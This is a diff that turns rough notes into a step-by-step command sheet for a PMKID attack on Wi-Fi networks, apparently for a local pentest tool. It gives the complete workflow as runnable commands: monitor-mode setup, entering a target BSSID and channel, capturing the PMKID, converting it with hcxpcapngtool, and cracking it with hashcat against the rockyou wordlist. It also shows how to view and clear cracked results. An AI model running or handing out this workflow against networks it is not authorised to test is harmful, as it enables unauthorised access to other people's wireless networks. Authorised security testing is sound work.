@@ -1,20 +1,71 @@
-sudo python3 wifi_pentest_cli.py
+# PMKID Attack - Instructions & Commands
+# ======================================
 
-interface: wlp3s0 (found by command: iw dev)
+## 1. STARTING THE TOOL
+# --------------------
+sudo python3 pmkid-cli.py
 
-ctrl + c to stop and rerun the python
+## 2. INTERFACE SETUP
+# ------------------
+# Find your wireless interface:
+iw dev
 
-interface: wlp3s0mon (by giving cursor the full error)
+# Common interface names:
+# - wlp3s0 (normal mode)
+# - wlp3s0mon (monitor mode)
 
+## 3. TROUBLESHOOTING INTERFACE ISSUES
+# -----------------------------------
+# If you get interface errors:
+# 1. Stop the program (Ctrl + C)
+# 2. Rerun: sudo python3 pmkid-cli.py
+# 3. When prompted for interface, use the monitor version (e.g., wlp3s0mon)
+
+## 4. PMKID ATTACK WORKFLOW
+# -------------------------
+# Step 1: Capture PMKID
+# - Choose option 1 in main menu and then PMKID attack
+# - Enter target BSSID and channel
+# - Wait for PMKID capture (user interaction is better with target) (Ctrl + C to stop)
+
+# Step 2: Convert PMKID to hash format
 hcxpcapngtool -o pmkid.22000 pmkid.pcapng
+
+# Step 3: Crack password with hashcat
 hashcat -m 22000 pmkid.22000 rockyou.txt
 
+## 5. HASHCAT COMMANDS
+# --------------------
+# Start password cracking:
+hashcat -m 22000 pmkid.22000 rockyou.txt
+
+# Show cracked results:
 hashcat -m 22000 pmkid.22000 rockyou.txt --show
 
-to find hashcat profile: sudo find / -name 'hashcat.potfile' 2>/dev/null
+# Find hashcat potfile location:
+sudo find / -name 'hashcat.potfile' 2>/dev/null
 
-clear the previously found hashes:  rm /home/hp/.local/share/hashcat/hashcat.potfile
+# Clear previously found hashes:
+rm /home/hp/.local/share/hashcat/hashcat.potfile
 
-for getting back wifi:
+## 6. RESTORE WIRELESS CONNECTION
+# -------------------------------
+# Stop monitor mode:
+# Restart network manager:
 sudo airmon-ng stop wlp3s0mon
 sudo systemctl restart NetworkManager
+
+## 7. USEFUL TIPS
+# ---------------
+# - Always run with sudo for wireless operations
+# - Monitor mode disables normal WiFi connection
+# - Use Ctrl + C to stop scanning/capture operations
+# - Keep rockyou.txt wordlist ready for password cracking
+# - The tool automatically handles interface name changes (wlp3s0 → wlp3s0mon)
+
+## 8. FILE LOCATIONS
+# ------------------
+# PMKID capture: pmkid.pcapng
+# Hash file: pmkid.22000
+# Password list: rockyou.txt (or custom)
+# Hashcat results: ~/.local/share/hashcat/hashcat.potfile
